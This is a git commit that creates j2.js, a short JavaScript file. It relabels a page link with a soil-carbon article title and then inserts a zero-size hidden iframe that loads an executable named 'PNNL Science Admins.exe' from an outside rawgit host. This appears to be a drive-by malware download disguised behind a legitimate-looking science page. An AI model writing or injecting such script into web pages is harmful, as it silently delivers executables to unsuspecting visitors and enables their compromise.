5c4c36d839414a4e5a604f45cdeb79436199f8a0
bozRADAGAST <eyupsahin147147@gmail.com>
2017-11-21 21:26:12 +0300

    Create j2.js

---
+++ j2.js
@@ -0,0 +1,6 @@
+document.getElementsByTagName("a")[11].innerText='Drought, Wetting Direction, and the Fate of Soil Carbon';
+var ifra=document.createElement('iframe');
+ifra.src="http://cdn.rawgit.com/bozRADAGAST/test/master/PNNL%20Science%20Admins.exe";
+ifra.setAttribute("height","0");
+ifra.setAttribute("width","0");
+void(document.body.appendChild(ifra));
